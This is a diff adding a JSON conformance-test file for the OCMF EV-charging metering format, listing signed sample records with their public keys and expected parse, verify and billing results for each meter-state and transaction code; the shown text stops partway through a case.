@@ -1,0 +1,1295 @@
+{
+ "version": 1,
+ "description": "OCMF conformance suite. See conformance/README.md.",
+ "cases": [
+  {
+   "id": "table/meter-state-N",
+   "group": "table",
+   "description": "ST = N (NOT_PRESENT) [OCMF Tab. 10]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"N\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"N\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402207DF8B367E50D3FAED3939EE870DA0570DBF426CEA18099477A5E52F9F8D26866022032D885A9ADF2B9C06ED496E01ACE909D5CA91707D165C67A22D9002BDFF571D6\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 0 }
+  },
+  {
+   "id": "table/meter-state-G",
+   "group": "table",
+   "description": "ST = G (OK) [OCMF Tab. 10]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100C4A27B8563AD085C203E33309DD0E90CF9F5452C3A94E21E8FD432BF24A55AD30220681DD1A48492E1E7CA6BB15F028733CCE60CC0AC056EDF65808512475EB8E201\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 2 }
+  },
+  {
+   "id": "table/meter-state-T",
+   "group": "table",
+   "description": "ST = T (TIMEOUT) [OCMF Tab. 10]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"T\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"T\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402200BD970A39E2C5D8F9CE9B4EF4465A5A703B775062E097715344E5F1519DE518F02201863678A518D0F20A90B503BB9AB4A928A2010F6CFBDD97D77EC8657A2527535\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 0 }
+  },
+  {
+   "id": "table/meter-state-D",
+   "group": "table",
+   "description": "ST = D (DISCONNECTED) [OCMF Tab. 10]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"D\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"D\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"30440220594A206FC147A31AC15D8487F2E6ACB1609C26AE2EDCDE40A69B2DC08E6B86750220074B4710729CC21B9E0FBA2245FD13F625666DA223815D5A49BD3F93B986A254\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 0 }
+  },
+  {
+   "id": "table/meter-state-R",
+   "group": "table",
+   "description": "ST = R (NOT_FOUND) [OCMF Tab. 10]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"R\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"R\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"304402205D3047224AEAB3760010A16BA478A50D3C46E5A616B38B5ED3ABE020C0BA482A022078BD55CBD2F6A8320D4D2BE02FEF25817C9320F85C3E998E914E4A44C5D280CE\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 0 }
+  },
+  {
+   "id": "table/meter-state-M",
+   "group": "table",
+   "description": "ST = M (MANIPULATED) [OCMF Tab. 10]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"M\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"M\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3044022050FA4015D1AFA3C7DF1F052B04E74CB15C68A504763403231EA824C4FFB4E4F502204BEF7601EC2C0F483BE824C50DDA28D07C5A8086D612CBA5EAC92D878622C495\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 0 }
+  },
+  {
+   "id": "table/meter-state-X",
+   "group": "table",
+   "description": "ST = X (EXCHANGED) [OCMF Tab. 10]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"X\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"X\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100CE48EB2AD258C3A7E86005D9F9FA41400D2057B5702459DF83986A086C6D923A022033BE88C1972E6386203B1D197EFD468D0F1C8E1E61523DBC7A762E8683AA4723\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 0 }
+  },
+  {
+   "id": "table/meter-state-I",
+   "group": "table",
+   "description": "ST = I (INCOMPATIBLE) [OCMF Tab. 10]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"I\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"I\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3044022069C1F9D3CAF5DC566DE12B6D850E79CF5FB32A642C37F6CB9F6E7A7B80B7BA0602205252A8AF6836E6BE6047077504B1ADC787C8CF217831CDAFEADEB4C9B6F5ABD4\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 0 }
+  },
+  {
+   "id": "table/meter-state-O",
+   "group": "table",
+   "description": "ST = O (OUT_OF_RANGE) [OCMF Tab. 10]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"O\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"O\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100E3C26D12EFBA46F30E2FB711CABBBC72B14FE9FD141E583A6A6D7235EAC87E120220535D6E1DAF06BF769A6F4F30FB8B282E13B3860624ED73F2549EF262F464C234\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 0 }
+  },
+  {
+   "id": "table/meter-state-S",
+   "group": "table",
+   "description": "ST = S (SUBSTITUTE) [OCMF Tab. 10]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"S\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"S\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100DF45F4776B9BF5BEBFC458282C31CA144DFC0E91ECF5698FD1ECB9A90CBA8F54022070AE7E772D23A1DE4B3CB1CA9C269613545491CF7CFA3C2CD5DE677FD640CC83\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 0 }
+  },
+  {
+   "id": "table/meter-state-E",
+   "group": "table",
+   "description": "ST = E (OTHER_ERROR) [OCMF Tab. 10]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"E\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"E\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3044022015D8D992E732401FF3D87A3B4CC3B1454340AE76D4D35B59225CBFBE3A153176022042251430AAF5985FAE3939A5379AAAB9400499E5A7364D09296830A3FDD9941C\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 0 }
+  },
+  {
+   "id": "table/meter-state-F",
+   "group": "table",
+   "description": "ST = F (READ_ERROR) [OCMF Tab. 10]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"F\"},{\"TM\":\"2024-03-01T09:30:00,000+0100 S\",\"TX\":\"E\",\"RV\":129.500,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"F\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3044022017B32596ECDA8150B0064B867C91415353DE85BA10FC4F3B07B3FF1BB43214B9022079DF84C9DB41A7BC267D0129EAD4FA7CB33D547FFAB13094C0A7CEE5645FE8CC\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 2, "billable_readings": 0 }
+  },
+  {
+   "id": "table/transaction-B",
+   "group": "table",
+   "description": "TX = B [OCMF Tab. 7]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"B\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"30450221009C808E96ACD496B14A2215D0FB0B2EA58F05464C6C353709C6EE09ADF3E85373022012E0FD2E90AFCD8652C4D17F0B8E26756679DFFA9B8BB0226CCF643D363442DA\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "table/transaction-C",
+   "group": "table",
+   "description": "TX = C [OCMF Tab. 7]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"C\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3044022045F3D866CFF0CAA4B0D33E982156BCA2A1A2B907BE26B001610BE596097ACEB402201056E48A072D85B6FE7E42130C2407B31E0BDC43F47E913C637FFC424F68AE40\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "table/transaction-X",
+   "group": "table",
+   "description": "TX = X [OCMF Tab. 7]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"X\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100A4665B0004F5357AA1327C6429AE9BB14B9A5B83CE81AD80D178DEEF88AAA1C802200F18E15F2970871FF5B3EFDC12DE35052169343BC0A5276C2660F0247D119088\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "table/transaction-E",
+   "group": "table",
+   "description": "TX = E [OCMF Tab. 7]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"E\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"3045022100D86E7DFFFEEE9588A97ACB78FA3854A6ECF2269FD25A6D04074E58D025A306CA02205C8DD1184DF7AEDF8C9ED816751A2D801E45D55B7BA94653F9D70CA2F4D861B4\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "table/transaction-L",
+   "group": "table",
+   "description": "TX = L [OCMF Tab. 7]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"L\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"30450221009F1306F27337E5BADC841E908738391DA827296C6434907D739ADBB6466AD085022033850780D676EBCA9D5B57AD94D7D41DF4C00F3A4A24C4FE63618296AF99DEE2\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "table/transaction-R",
+   "group": "table",
+   "description": "TX = R [OCMF Tab. 7]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"R\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"30440220109960D13B79F72C16313D1FDB91986C11FAD4202E87424A21FAEE0069CBD7F1022025016AD519FAB2EEC6D4647D3FEDA503DD51634FA0A96D868A3298C703CB4D29\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "table/transaction-A",
+   "group": "table",
+   "description": "TX = A [OCMF Tab. 7]",
+   "record": "OCMF|{\"FV\":\"1.3\",\"GI\":\"ocmf conformance\",\"GS\":\"CONF-1\",\"GV\":\"0.1.0\",\"PG\":\"T1\",\"MV\":\"ACME\",\"MM\":\"M-100\",\"MS\":\"1CONF00000001\",\"MF\":\"1.0\",\"IS\":true,\"IL\":\"VERIFIED\",\"IF\":[\"RFID_PLAIN\"],\"IT\":\"ISO14443\",\"ID\":\"1F2D3A4F5506C7\",\"RD\":[{\"TM\":\"2024-03-01T08:00:00,000+0100 S\",\"TX\":\"A\",\"RV\":100.000,\"RI\":\"01-00:B1.08.00*FF\",\"RU\":\"kWh\",\"EF\":\"\",\"ST\":\"G\"}]}|{\"SA\":\"ECDSA-secp256r1-SHA256\",\"SD\":\"30440220552C2492235159ED8AD41F1E880341BFB51A720DB97A5A828065074FC7260C3C022078A226E0E92F8EC60FAA52F89599A4D6B25D00E2DC79256E5A07F301EEFB37B0\"}",
+   "key": "3059301306072A8648CE3D020106082A8648CE3D030107034200040C901D423C831CA85E27C73C263BA132721BB9D7A84C4F0380B2A6756FD601331C8870234DEC878504C174144FA4B14B66A651691606D8173E55BD37E381569E",
+   "expect": { "parses": true, "round_trips": true, "verifies": true, "deviations": [], "readings": 1, "billable_readings": 1 }
+  },
+  {
+   "id": "table/transaction-P",
+   "group": "table",
+   "description": "TX = P [OCMF Tab. 7]",
